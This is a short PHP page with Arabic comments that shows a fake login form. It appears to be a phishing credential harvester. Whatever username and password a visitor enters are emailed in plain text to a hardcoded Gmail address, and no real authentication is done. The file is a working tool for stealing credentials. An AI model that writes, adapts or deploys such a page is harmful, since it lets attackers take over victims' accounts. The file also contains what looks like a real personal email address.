<?php
// إعدادات البريد الإلكتروني
$admin_email = "gambol.sigma14@gmail.com"; // ضع بريدك هنا

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? htmlspecialchars($_POST['username']) : '';
    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : '';

    // نص الرسالة
    $message = "تمت محاولة تسجيل دخول:\n";
    $message .= "اسم المستخدم: $username\n";
    $message .= "كلمة المرور: $password\n";

    // إرسال البريد
    mail($admin_email, "محاولة تسجيل دخول جديدة", $message);

    // يمكنك إعادة توجيه المستخدم أو عرض رسالة هنا
    echo "تم إرسال بيانات الدخول.";
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول</title>
</head>
<body>
    <form method="post">
        <label>اسم المستخدم:</label>
        <input type="text" name="username" required><br>
        <label>كلمة المرور:</label>
        <input type="password" name="password" required><br>
        <button type="submit">تسجيل الدخول</button>
    </form>
</body>
</html>